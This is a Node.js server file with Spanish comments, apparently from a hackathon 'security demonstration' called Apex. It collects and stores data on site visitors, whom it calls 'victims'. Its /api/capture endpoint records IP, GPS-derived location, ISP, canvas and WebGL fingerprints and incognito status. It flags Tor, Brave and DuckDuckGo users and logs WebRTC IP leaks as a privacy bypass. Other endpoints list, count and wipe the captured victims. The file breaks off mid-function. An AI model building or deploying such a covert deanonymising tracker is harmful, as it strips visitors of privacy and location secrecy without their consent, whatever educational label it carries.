const express = require('express');
const cors = require('cors');
const { MongoClient, ServerApiVersion } = require('mongodb');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Configuration
const uri = process.env.MONGODB_URI;

if (!uri) {
  console.error('❌ MONGODB_URI no está configurada en las variables de entorno');
  process.exit(1);
}

// Opciones de conexión optimizadas para Node.js 20+
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
  connectTimeoutMS: 30000,
  socketTimeoutMS: 30000,
  serverSelectionTimeoutMS: 30000,
  maxPoolSize: 10,
  minPoolSize: 2,
  retryWrites: true,
  retryReads: true,
  w: 'majority'
});

let victimsCollection;

// ═══════════════════════════════════════
// 🗄️ CACHE SYSTEM PARA GEOLOCALIZACIÓN
// ═══════════════════════════════════════
const locationCache = new Map();
const CACHE_TTL = 3600000; // 1 hora en milisegundos

function getCachedLocation(ip) {
  const cached = locationCache.get(ip);
  if (cached && (Date.now() - cached.timestamp < CACHE_TTL)) {
    console.log(`📦 Cache hit para IP: ${ip}`);
    return cached.data;
  }
  return null;
}

function setCachedLocation(ip, data) {
  locationCache.set(ip, {
    data: data,
    timestamp: Date.now()
  });
  console.log(`💾 IP ${ip} guardada en caché`);
}

// Limpiar caché cada hora
setInterval(() => {
  const now = Date.now();
  for (const [ip, cached] of locationCache.entries()) {
    if (now - cached.timestamp > CACHE_TTL) {
      locationCache.delete(ip);
    }
  }
  console.log(`🧹 Cache limpiado. Entradas activas: ${locationCache.size}`);
}, CACHE_TTL);

// Conectar a MongoDB Atlas
async function connectDB() {
  try {
    await client.connect();
    await client.db("admin").command({ ping: 1 });
    console.log("✅ Conectado a MongoDB Atlas");
    
    const db = client.db('apex-db');
    victimsCollection = db.collection('victims');
    
    // Crear índices
    await victimsCollection.createIndex({ fingerprint: 1 }, { unique: true });
    await victimsCollection.createIndex({ timestamp: -1 });
    console.log("📊 Índices creados en MongoDB");
    
  } catch (error) {
    console.error("❌ Error conectando a MongoDB:", error);
    process.exit(1);
  }
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Generar fingerprint ENFOCADO EN DATOS MÓVILES (alta tasa de éxito)
function generateFingerprint(data, ip, userAgent) {
  // Priorizar datos que SIEMPRE están disponibles en móviles
  const components = [
    // ✅ SIEMPRE disponible
    userAgent || '',
    ip || '',

    // ✅ MUY ALTA probabilidad (>95%)
    data.screen?.resolution || '',
    data.screen?.colorDepth || '24',
    data.browser?.language || 'en',
    data.timezoneInfo?.timezone || Intl?.DateTimeFormat().resolvedOptions().timeZone || '',

    // ✅ ALTA probabilidad en móviles (>80%)
    data.device?.platform || '',
    data.device?.vendor || '',
    data.device?.maxTouchPoints || '0',

    // ✅ MEDIA probabilidad (>60%)
    data.fingerprints?.canvas || '',
    data.fingerprints?.webglRenderer || '',

    // ✅ Opcional pero útil si está disponible
    data.device?.cpuCores || '',
    data.device?.memory || '',
    (data.fingerprints?.fonts || []).slice(0, 5).join(','), // Solo primeras 5 fonts

    // ✅ Timestamp para garantizar unicidad
    Date.now().toString()
  ].join('|');

  return crypto.createHash('sha256').update(components).digest('hex');
}

// Función para parsear User-Agent
function parseUserAgent(ua) {
  const browser = { name: 'Unknown', version: 'Unknown' };
  const os = { name: 'Unknown', version: 'Unknown', platform: 'Unknown' };

  // Detectar OS
  if (ua.includes('Windows NT 10.0')) os.name = 'Windows 10/11';
  else if (ua.includes('Windows NT 6.3')) os.name = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.2')) os.name = 'Windows 8';
  else if (ua.includes('Windows NT 6.1')) os.name = 'Windows 7';
  else if (ua.includes('Mac OS X')) {
    os.name = 'macOS';
    const match = ua.match(/Mac OS X ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  } else if (ua.includes('Android')) {
    os.name = 'Android';
    const match = ua.match(/Android ([0-9.]+)/);
    if (match) os.version = match[1];
  } else if (ua.includes('Linux')) os.name = 'Linux';
  else if (ua.includes('iPhone') || ua.includes('iPad')) {
    os.name = 'iOS';
    const match = ua.match(/OS ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  }

  // Detectar Platform
  if (ua.includes('Win')) os.platform = 'Windows';
  else if (ua.includes('Mac')) os.platform = 'MacOS';
  else if (ua.includes('Linux')) os.platform = 'Linux';
  else if (ua.includes('Android')) os.platform = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os.platform = 'iOS';

  // Detectar Browser
  if (ua.includes('Edg/')) {
    browser.name = 'Edge';
    const match = ua.match(/Edg\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
    browser.name = 'Chrome';
    const match = ua.match(/Chrome\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Firefox/')) {
    browser.name = 'Firefox';
    const match = ua.match(/Firefox\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
    browser.name = 'Safari';
    const match = ua.match(/Version\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
    browser.name = 'Opera';
    const match = ua.match(/(?:Opera|OPR)\/([0-9.]+)/);
    if (match) browser.version = match[1];
  }

  return { browser, os };
}

// Obtener geolocalización desde ip-api.com (sin límites para uso no comercial)
async function getLocationFromIPAPI(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        if (!response.ok) throw new Error('ip-api.com request failed');

        const data = await response.json();

        if (data.status === 'fail') {
            throw new Error(data.message || 'API error');
        }

        return {
            ip: data.query || ip,
            city: data.city || null,
            country: data.countryCode || null,
            country_name: data.country || null,
            region: data.regionName || null,
            timezone: data.timezone || null,
            latitude: data.lat || null,
            longitude: data.lon || null,
            isp: data.isp || data.org || null,
            postal: data.zip || null,
            continent: null,
            source: 'ip-api'
        };
    } catch (error) {
        console.error('Error en ip-api.com:', error.message);
        return null;
    }
}

// Obtener geolocalización precisa desde IP usando ipapi.co con fallback a ip-api.com
async function getLocationFromIP(ip) {
    // Si es localhost o IP interna, retornar datos por defecto
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return {
            ip: ip,
            city: 'Local',
            country: 'XX',
            country_name: 'Local Network',
            region: 'Local',
            timezone: 'UTC',
            latitude: 0,
            longitude: 0,
            isp: 'Local',
            source: 'local'
        };
    }

    // ✅ VERIFICAR CACHÉ PRIMERO
    const cached = getCachedLocation(ip);
    if (cached) {
        return { ...cached, fromCache: true };
    }

    // Intentar con ipapi.co primero
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        if (!response.ok) throw new Error('API request failed');

        const data = await response.json();

        // Verificar si la API retornó error (rate limit, etc)
        if (data.error) {
            throw new Error(data.reason || 'API error');
        }

        const locationData = {
            ip: data.ip || ip,
            city: data.city || null,
            country: data.country_code || null,
            country_name: data.country_name || null,
            region: data.region || null,
            timezone: data.timezone || null,
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            isp: data.org || null,
            postal: data.postal || null,
            continent: data.continent_code || null,
            source: 'ipapi'
        };

        // Solo guardar en caché si obtuvimos datos válidos
        if (locationData.city || locationData.country) {
            setCachedLocation(ip, locationData);
            return locationData;
        } else {
            throw new Error('No location data returned');
        }
    } catch (error) {
        console.error('ipapi.co falló, intentando con ip-api.com:', error.message);

        // ✅ FALLBACK a ip-api.com
        const fallbackData = await getLocationFromIPAPI(ip);

        if (fallbackData && (fallbackData.city || fallbackData.country)) {
            // Guardar en caché el resultado del fallback
            setCachedLocation(ip, fallbackData);
            return fallbackData;
        }

        // Si ambas APIs fallaron, retornar datos mínimos
        console.error('Ambas APIs de geolocalización fallaron para IP:', ip);
        return {
            ip: ip,
            city: null,
            country: null,
            country_name: null,
            region: null,
            timezone: null,
            latitude: null,
            longitude: null,
            isp: null,
            source: 'failed'
        };
    }
}

// Obtener ciudad/país desde coordenadas GPS usando reverse geocoding
async function getLocationFromCoordinates(lat, lon) {
    try {
        // Usar Nominatim de OpenStreetMap (gratis, sin límites estrictos)
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`,
            {
                headers: {
                    'User-Agent': 'APEX-Security-Demo/1.0'
                }
            }
        );

        if (!response.ok) throw new Error('Geocoding API failed');

        const data = await response.json();
        const address = data.address || {};

        return {
            city: address.city || address.town || address.village || address.municipality || 'Unknown',
            country: address.country_code?.toUpperCase() || 'Unknown',
            country_name: address.country || 'Unknown',
            region: address.state || address.region || 'Unknown',
            postal: address.postcode || 'Unknown',
            latitude: parseFloat(lat),
            longitude: parseFloat(lon),
            source: 'gps'
        };
    } catch (error) {
        console.error('Error en reverse geocoding:', error);
        return null;
    }
}

// Verificar si la víctima ya fue capturada
async function isAlreadyCaptured(fingerprint) {
  try {
    if (!fingerprint) return false;
    const count = await victimsCollection.countDocuments({ fingerprint });
    return count > 0;
  } catch (error) {
    console.error("Error verificando duplicado:", error);
    return false;
  }
}

// Guardar víctima en MongoDB (FIXED VERSION)
async function saveVictim(victimData) {
  try {
    // Validación
    if (!victimData || typeof victimData !== 'object') {
      console.error("❌ Invalid victim data");
      return false;
    }

    if (!victimData.fingerprint || typeof victimData.fingerprint !== 'string') {
      console.error("❌ Missing or invalid fingerprint");
      return false;
    }

    // ✅ FIX: Store values in local variables BEFORE any MongoDB operations
    const fingerprint = victimData.fingerprint;
    const username = victimData.username || 'Unknown';
    const ip = victimData.network?.ip || 'Unknown';
    const city = victimData.network?.city || 'Unknown';
    const country = victimData.network?.country || 'Unknown';
    const isp = victimData.network?.isp || 'Unknown';

    victimData.timestamp = new Date();
    await victimsCollection.insertOne(victimData);

    // ✅ FIX: Use local variables instead of victimData properties
    const fingerprintPreview = fingerprint.substring(0, 8);

    // Badges especiales
    let badges = [];
    if (victimData.incognitoMode?.isIncognito) badges.push('🕵️ INCÓGNITO');
    if (victimData.privacyBrowser?.isTor) badges.push('🧅 TOR');
    if (victimData.privacyBrowser?.isDuckDuckGo) badges.push('🦆 DDG');
    if (victimData.privacyBrowser?.isBrave) badges.push('🦁 BRAVE');
    if (victimData.device?.isMobile) badges.push('📱 MÓVIL');
    if (victimData.device?.isBot) badges.push('🤖 BOT');

    const badgeStr = badges.length > 0 ? ` [${badges.join(' ')}]` : '';

    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]${badgeStr}`);
    console.log(`   🌐 ${ip} | ${city}, ${country} | ISP: ${isp}`);
    return true;
    
  } catch (error) {
    if (error.code === 11000) {
      // ✅ Already had safe optional chaining here
      const fingerprintPreview = victimData.fingerprint?.substring(0, 8) || 'Unknown';
      console.log(`⚠️ Víctima duplicada ignorada: ${fingerprintPreview}...`);
      return false;
    }
    console.error("Error guardando víctima:", error);
    return false;
  }
}

// Obtener todas las víctimas
async function getVictims() {
  try {
    return await victimsCollection.find({}).sort({ timestamp: -1 }).toArray();
  } catch (error) {
    console.error("Error obteniendo víctimas:", error);
    return [];
  }
}

// === ROUTES ===

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    server: 'Apex Security Demo',
    version: '3.0.0',
    database: 'MongoDB Atlas ☁️',
    purpose: '⚠️ EDUCATIONAL - Hackathon Security Demonstration',
    timestamp: new Date().toISOString()
  });
});

// Capturar datos de víctima
app.post('/api/capture', async (req, res) => {
  try {
    const data = req.body;
    
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress;

    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Si no hay fingerprint, generarlo
    if (!data.fingerprint) {
      data.fingerprint = generateFingerprint(data, clientIP, userAgent);
      console.log(`🔑 Fingerprint generado: ${data.fingerprint.substring(0, 8)}...`);
    }

    // Verificar fingerprint único
    if (await isAlreadyCaptured(data.fingerprint)) {
      return res.json({ 
        success: false, 
        message: 'Duplicate fingerprint detected',
        duplicate: true 
      });
    }

    // ✅ PRIORIZAR GPS SOBRE IP PARA UBICACIÓN
    let geo = null;
    let locationSource = 'unknown';

    // 1. Si hay GPS, usarlo primero (más preciso)
    if (data.geolocation?.latitude && data.geolocation?.longitude) {
      console.log(`🌍 GPS disponible, usando coordenadas: (${data.geolocation.latitude}, ${data.geolocation.longitude})`);

      const gpsLocation = await getLocationFromCoordinates(
        data.geolocation.latitude,
        data.geolocation.longitude
      );

      if (gpsLocation && (gpsLocation.city || gpsLocation.country)) {
        // Obtener IP info para ISP y timezone
        const ipInfo = await getLocationFromIP(clientIP);

        geo = {
          ip: ipInfo.ip || clientIP,
          isp: ipInfo.isp,
          timezone: ipInfo.timezone,
          ...gpsLocation, // Sobrescribir ubicación con datos GPS
          source: 'gps' // Marcar que viene de GPS
        };
        locationSource = 'gps';
        console.log(`✅ Ubicación obtenida desde GPS: ${geo.city}, ${geo.country}`);
      } else {
        console.log('⚠️ Reverse geocoding falló, usando IP como fallback');
        geo = await getLocationFromIP(clientIP);
        locationSource = geo.source || 'ip';
      }
    } else {
      // 2. Si no hay GPS, usar IP
      geo = await getLocationFromIP(clientIP);
      locationSource = geo.source || 'ip';
    }

    // ✅ DETECCIÓN DE VPN/PROXY MEJORADA
    const vpnDetection = {
      timezoneMismatch: false,
      webRTCLeak: false,
      suspiciousISP: false,
      likelyVPN: false,
      confidence: 'low' // low, medium, high
    };

    // 1. Verificar mismatch entre timezone del navegador y ubicación de IP
    if (data.timezoneInfo?.timezone && geo?.timezone && geo.timezone !== 'UTC') {
      const browserTZ = data.timezoneInfo.timezone;
      const ipTZ = geo.timezone;

      // Comparar solo si ambos están disponibles y no son default
      if (browserTZ && ipTZ && browserTZ !== ipTZ && browserTZ !== 'UTC') {
        vpnDetection.timezoneMismatch = true;
        vpnDetection.confidence = 'high';
        console.log(`⚠️ Timezone mismatch detectado: Browser=${browserTZ}, IP=${ipTZ}`);
      }
    }

    // 2. Verificar WebRTC leak (IP pública diferente a la IP del request)
    if (data.webRTC?.publicIP &&
        data.webRTC.publicIP !== 'Unknown' &&
        data.webRTC.publicIP !== 'Error' &&
        data.webRTC.publicIP !== clientIP &&
        !data.webRTC.publicIP.startsWith('192.168') &&
        !data.webRTC.publicIP.startsWith('10.')) {

      vpnDetection.webRTCLeak = true;
      vpnDetection.confidence = 'high';
      console.log(`⚠️ WebRTC leak detectado: WebRTC IP=${data.webRTC.publicIP}, Request IP=${clientIP}`);
    }

    // 3. ISPs conocidos de VPN/Hosting
    const vpnISPs = [
      'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
      'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
      'hosting', 'cloudflare', 'akamai'
    ];

    if (geo?.isp && typeof geo.isp === 'string') {
      const ispLower = geo.isp.toLowerCase();
      if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
        vpnDetection.suspiciousISP = true;
        if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
        console.log(`⚠️ ISP sospechoso de VPN: ${geo.isp}`);
      }
    }

    // 4. Determinar si probablemente es VPN
    if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = 'high';
    } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
    } else if (vpnDetection.suspiciousISP) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = 'low';
    }

    // Crear objeto network completo con todos los datos
    const networkData = {
      ip: geo?.ip || clientIP,
      country: geo?.country || 'Unknown',
      country_name: geo?.country_name || 'Unknown',
      city: geo?.city || 'Unknown',
      region: geo?.region || 'Unknown',
      timezone: geo?.timezone || 'Unknown',
      latitude: geo?.latitude || null,
      longitude: geo?.longitude || null,
      isp: geo?.isp || 'Unknown',
      postal: geo?.postal || 'Unknown',
      continent: geo?.continent || 'Unknown',
      connectionType: data.network?.effectiveType || 'Unknown',
      downlink: data.network?.downlink || 'Unknown',
      rtt: data.network?.rtt || 'Unknown',
      saveData: data.network?.saveData || false,
      locationSource: locationSource, // Indicar de dónde viene la ubicación
      vpnDetection: vpnDetection // ✅ NUEVO: Detección de VPN/Proxy
    };

    data.network = networkData;

    // Parsear User-Agent
    const { browser, os } = parseUserAgent(userAgent);

    if (!data.browser) data.browser = {};
    data.browser.name = browser.name;
    data.browser.version = browser.version;
    data.browser.userAgent = userAgent;

    if (!data.os) data.os = {};
    data.os.name = os.name;
    data.os.version = os.version;
    data.os.platform = os.platform;

    // ✅ DETECTAR TIPO DE DISPOSITIVO
    if (!data.device) data.device = {};

    const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
    const isTablet = /tablet|ipad|playbook|silk/i.test(userAgent);
    const isDesktop = !isMobile && !isTablet;

    data.device.type = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
    data.device.isMobile = isMobile;
    data.device.isTablet = isTablet;
    data.device.isDesktop = isDesktop;

    // Detectar si es un bot
    const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
    data.device.isBot = botPatterns.test(userAgent);

    // Detectar headless browser (usado en automatización)
    data.device.isHeadless = userAgent.includes('HeadlessChrome') ||
                             userAgent.includes('PhantomJS') ||
                             (data.browser?.plugins && data.browser.plugins.length === 0 && !isMobile);

    // 🕵️ MODO INCÓGNITO - Log especial (separado de Tor)
    if (data.incognitoMode?.isIncognito) {
      console.log(`🕵️ MODO INCÓGNITO DETECTADO (${data.incognitoMode.confidence})`);
      console.log(`   📊 Indicadores: ${data.incognitoMode.indicators}`);
      console.log(`   🔍 Métodos: ${data.incognitoMode.methods.join(', ')}`);

      if (data.incognitoMode.tests?.storageQuota) {
        const quota = data.incognitoMode.tests.storageQuota.quota;
        if (quota) {
          const quotaMB = (quota / 1024 / 1024).toFixed(2);
          console.log(`   💾 Storage Quota: ${quotaMB} MB (limitado: ${quota < 120000000})`);
        }
      }
    }

    // 🦆 DETECTAR NAVEGADORES DE PRIVACIDAD
    if (!data.privacyBrowser) {
      data.privacyBrowser = {
        isDuckDuckGo: userAgent.includes('DuckDuckGo') || userAgent.includes('ddg'),
        isBrave: userAgent.includes('Brave'),
        isTor: userAgent.includes('Tor'),
        privacyFeatures: [],
        antiTrackingScore: 0
      };

      // Calcular score basado en características detectadas
      if (data.privacyBrowser.isDuckDuckGo) {
        data.privacyBrowser.privacyFeatures.push('DuckDuckGo Browser');
        data.privacyBrowser.antiTrackingScore += 30;
      }
      if (data.privacyBrowser.isBrave) {
        data.privacyBrowser.privacyFeatures.push('Brave Browser');
        data.privacyBrowser.antiTrackingScore += 35;
      }
      if (data.privacyBrowser.isTor) {
        data.privacyBrowser.privacyFeatures.push('Tor Browser');
        data.privacyBrowser.antiTrackingScore += 50;
      }
    }

    // Log especial para navegadores de privacidad
    if (data.privacyBrowser?.isDuckDuckGo || data.privacyBrowser?.isBrave || data.privacyBrowser?.isTor) {
      console.log(`🦆 Navegador de privacidad detectado: ${data.privacyBrowser.privacyFeatures.join(', ')}`);
      console.log(`   📊 Anti-Tracking Score: ${data.privacyBrowser.antiTrackingScore}/100`);

      // Tor Browser específico
      if (data.privacyBrowser.isTor) {
        console.log(`   🧅 Tor Browser confirmado (Confianza: ${data.privacyBrowser.torConfidence || 100}%)`);

        // Tor bloqueará WebRTC, pero intentamos detectar la IP de salida del nodo Tor
        if (data.webRTC?.blocked) {
          console.log(`   🔒 WebRTC bloqueado (esperado en Tor)`);
          console.log(`   🌐 IP del nodo Tor de salida: ${clientIP}`);
        }

        // Timezone en Tor siempre será UTC
        if (data.timezoneInfo?.timezone === 'UTC') {
          console.log(`   🕐 Timezone UTC confirmado (Tor protection activa)`);
        }

        // Fingerprints capturados incluso en Tor
        if (data.fingerprints?.advancedCanvas?.hash) {
          console.log(`   🎨 Canvas Hash capturado: ${data.fingerprints.advancedCanvas.hash} (único por sesión)`);
        }

        if (data.screen?.isTorResolution) {
          console.log(`   🖥️ Resolución Tor detectada: ${data.screen.resolution} (redondeada)`);
        }

        if (data.extensions?.detected && data.extensions.detected.length > 0) {
          console.log(`   🔌 Extensiones detectadas: ${data.extensions.detected.join(', ')}`);
        }

        // Comportamiento capturado
        if (data.behavior) {
          console.log(`   🖱️ Comportamiento: ${data.behavior.clicks} clicks, ${data.behavior.mouseMovements} movimientos, ${data.behavior.timeOnPage}s`);
        }
      } else {
        // Otros navegadores de privacidad
        if (data.webRTC?.publicIP && data.webRTC.publicIP !== 'Unknown' && data.webRTC.publicIP !== 'Error' && data.webRTC.publicIP !== 'Blocked') {
          console.log(`   🌐 WebRTC IP capturada: ${data.webRTC.publicIP} (bypass privacidad)`);
        } else if (data.webRTC?.blocked) {
          console.log(`   🔒 WebRTC bloqueado por navegador`);
        }

        if (data.timezoneInfo?.timezone) {
          console.log(`   🕐 Timezone real: ${data.timezoneInfo.timezone}`);
        }
      }
    }

    // Guardar en MongoDB
    const saved = await saveVictim(data);
    
    if (saved) {
      res.json({ 
        success: true, 
        message: 'Data captured successfully',
        victimId: data.fingerprint.substring(0, 8)
      });
    } else {
      res.json({ 
        success: false, 
        message: 'Failed to save data' 
      });
    }

  } catch (error) {
    console.error('Error en /api/capture:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Obtener estadísticas
app.get('/api/stats', async (req, res) => {
  try {
    const victims = await getVictims();
    
    const stats = {
      totalVictims: victims.length,
      lastCapture: victims.length > 0 ? victims[0].timestamp : null,
      uniqueCountries: [...new Set(victims.map(v => v.network?.country).filter(Boolean))].length,
      browsers: {},
      operatingSystems: {},
      devices: {},
      recentVictims: victims.slice(0, 5).map(v => ({
        username: v.username || 'Unknown',
        timestamp: v.timestamp,
        country: v.network?.country || 'Unknown',
        browser: v.browser?.name || 'Unknown',
        os: v.os?.name || 'Unknown'
      }))
    };

    // Contar browsers
    victims.forEach(v => {
      const browser = v.browser?.name || 'Unknown';
      stats.browsers[browser] = (stats.browsers[browser] || 0) + 1;
    });

    // Contar OS
    victims.forEach(v => {
      const os = v.os?.name || 'Unknown';
      stats.operatingSystems[os] = (stats.operatingSystems[os] || 0) + 1;
    });

    // Contar dispositivos
    victims.forEach(v => {
      const device = v.device?.type || 'Unknown';
      stats.devices[device] = (stats.devices[device] || 0) + 1;
    });

    res.json(stats);
  } catch (error) {
    console.error('Error en /api/stats:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Obtener todas las víctimas
app.get('/api/victims', async (req, res) => {
  try {
    const victims = await getVictims();
    res.json(victims);
  } catch (error) {
    console.error('Error en /api/victims:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Limpiar todas las víctimas (para testing)
app.delete('/api/clear', async (req, res) => {
  try {
    const result = await victimsCollection.deleteMany({});
    console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} víctimas eliminadas`);
    res.json({
      success: true,
      message: `${result.deletedCount} victims cleared`,
      deletedCount: result.deletedCount
    });
  } catch (error) {
    console.error('Error en /api/clear:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

// ✅ RE-PROCESAR VÍCTIMAS CON UBICACIÓN UNKNOWN
app.post('/api/reprocess-locations', async (req, res) => {
  try {
    console.log('🔄 Re-procesando ubicaciones Unknown...');

    // Buscar víctimas con ubicación Unknown
    const victimsWithUnknownLocation = await victimsCollection.find({
      $or: [
        { 'network.city': 'Unknown' },
        { 'network.country': 'Unknown' },
        { 'network.city': { $exists: false } },
        { 'network.country': { $exists: false } }
      ]
    }).toArray();

    console.log(`📊 Encontradas ${victimsWithUnknownLocation.length} víctimas con ubicación Unknown`);

    let updated = 0;
    let failed = 0;
    let skipped = 0;

    for (const victim of victimsWithUnknownLocation) {
      try {
        let newGeo = null;
        let locationSource = 'unknown';

        // 1. Intentar con GPS si está disponible
        if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
          console.log(`🌍 Víctima ${victim._id}: Intentando GPS...`);

          const gpsLocation = await getLocationFromCoordinates(
            victim.geolocation.latitude,
            victim.geolocation.longitude
          );

          if (gpsLocation && (gpsLocation.city || gpsLocation.country)) {
            // Obtener IP info
            const ipInfo = await getLocationFromIP(victim.network?.ip || '8.8.8.8');

            newGeo = {
              ip: victim.network?.ip || 'Unknown',
              isp: ipInfo.isp,
              timezone: ipInfo.timezone,
              ...gpsLocation,
              source: 'gps'
            };
            locationSource = 'gps';
            console.log(`   ✅ GPS exitoso: ${newGeo.city}, ${newGeo.country}`);
          }
        }

        // 2. Si GPS falló o no está disponible, intentar con IP
        if (!newGeo && victim.network?.ip) {
          console.log(`🌐 Víctima ${victim._id}: Intentando IP (${victim.network.ip})...`);

          const ipLocation = await getLocationFromIP(victim.network.ip);

          if (ipLocation && (ipLocation.city || ipLocation.country)) {
            newGeo = ipLocation;
            locationSource = ipLocation.source || 'ip';
            console.log(`   ✅ IP exitosa: ${newGeo.city}, ${newGeo.country}`);
          }
        }

        // 3. Actualizar si obtuvimos nuevos datos
        if (newGeo && (newGeo.city || newGeo.country)) {
          const updates = {
            'network.city': newGeo.city || 'Unknown',
            'network.country': newGeo.country || 'Unknown',
            'network.country_name': newGeo.country_name || 'Unknown',
            'network.region': newGeo.region || 'Unknown',
            'network.latitude': newGeo.latitude || null,
            'network.longitude': newGeo.longitude || null,
            'network.timezone': newGeo.timezone || 'Unknown',
            'network.isp': newGeo.isp || victim.network?.isp || 'Unknown',
            'network.postal': newGeo.postal || 'Unknown',
            'network.locationSource': locationSource
          };

          await victimsCollection.updateOne(
            { _id: victim._id },
            { $set: updates }
          );

          updated++;
          console.log(`   📝 Actualizado: ${newGeo.city}, ${newGeo.country}`);
        } else {
          skipped++;
          console.log(`   ⏭️ Sin datos disponibles, omitido`);
        }

        // Pequeña pausa para no saturar las APIs
        await new Promise(resolve => setTimeout(resolve, 1000));

      } catch (error) {
        console.error(`   ❌ Error procesando víctima ${victim._id}:`, error.message);
        failed++;
      }
    }

    console.log(`✅ Re-procesamiento completado:`);
    console.log(`   📊 Total: ${victimsWithUnknownLocation.length}`);
    console.log(`   ✅ Actualizados: ${updated}`);
    console.log(`   ⏭️ Omitidos: ${skipped}`);
    console.log(`   ❌ Errores: ${failed}`);

    res.json({
      success: true,
      message: 'Location reprocessing completed',
      total: victimsWithUnknownLocation.length,
      updated: updated,
      skipped: skipped,
      failed: failed
    });

  } catch (error) {
    console.error('Error en /api/reprocess-locations:', error);
    res.status(500).json({
      success: false,
      error: 'Reprocessing failed',
      details: error.message
    });
  }
});

// ✅ MIGRAR/ACTUALIZAR REGISTROS ANTIGUOS
app.post('/api/migrate', async (req, res) => {
  try {
    console.log('🔄 Iniciando migración de datos...');

    const allVictims = await victimsCollection.find({}).toArray();
    let updated = 0;
    let errors = 0;

    for (const victim of allVictims) {
      try {
        const updates = {};
        let needsUpdate = false;

        // 1. Asegurar que device.type existe
        if (!victim.device?.type) {
          const ua = victim.browser?.userAgent || '';
          const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua);
          const isTablet = /tablet|ipad|playbook|silk/i.test(ua);

          updates['device.type'] = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
          updates['device.isMobile'] = isMobile;
          updates['device.isTablet'] = isTablet;
          updates['device.isDesktop'] = !isMobile && !isTablet;
          needsUpdate = true;
        }

        // 2. Detectar bots si no existe
        if (victim.device?.isBot === undefined) {
          const ua = victim.browser?.userAgent || '';
          const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
          updates['device.isBot'] = botPatterns.test(ua);
          needsUpdate = true;
        }

        // 3. Re-evaluar VPN detection si está desactualizado o mal configurado
        if (!victim.network?.vpnDetection || !victim.network.vpnDetection.confidence) {
          const vpnDetection = {
            timezoneMismatch: false,
            webRTCLeak: false,
            suspiciousISP: false,
            likelyVPN: false,
            confidence: 'low'
          };

          // Timezone mismatch
          if (victim.timezoneInfo?.timezone && victim.network?.timezone &&
              victim.network.timezone !== 'Unknown' && victim.network.timezone !== 'UTC') {
            if (victim.timezoneInfo.timezone !== victim.network.timezone &&
                victim.timezoneInfo.timezone !== 'UTC') {
              vpnDetection.timezoneMismatch = true;
              vpnDetection.confidence = 'high';
            }
          }

          // WebRTC leak
          const clientIP = victim.network?.ip;
          if (victim.webRTC?.publicIP &&
              victim.webRTC.publicIP !== 'Unknown' &&
              victim.webRTC.publicIP !== 'Error' &&
              victim.webRTC.publicIP !== clientIP &&
              !victim.webRTC.publicIP.startsWith('192.168') &&
              !victim.webRTC.publicIP.startsWith('10.')) {
            vpnDetection.webRTCLeak = true;
            vpnDetection.confidence = 'high';
          }

          // ISP sospechoso
          const vpnISPs = [
            'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
            'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
            'hosting', 'cloudflare', 'akamai'
          ];

          if (victim.network?.isp && typeof victim.network.isp === 'string') {
            const ispLower = victim.network.isp.toLowerCase();
            if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
              vpnDetection.suspiciousISP = true;
              if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
            }
          }

          // Determinar likelyVPN
          if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = 'high';
          } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
